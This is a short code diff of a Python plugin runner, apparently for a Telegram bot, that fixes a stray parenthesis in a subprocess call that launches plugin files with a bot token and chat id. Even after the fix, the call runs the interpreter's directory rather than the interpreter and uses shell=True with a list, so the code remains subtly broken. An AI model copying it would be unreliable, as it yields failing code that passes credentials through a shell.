@@ -39,7 +39,7 @@ class Plugin():
 								module = i.replace("import ","").split(".")[0]
 							self._.Send_Message("%F0%9F%93%8C Installing (" + module + ")" + " Module...")
 							self._.Install_Module(module)
-				sub = subprocess.Popen([path.dirname(sys.executable)), filename, self.token, self.chat_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+				sub = subprocess.Popen([path.dirname(sys.executable), filename, self.token, self.chat_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			else:
 				sub = subprocess.Popen([filename, self.token, self.chat_id] ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			output, error = sub.communicate()
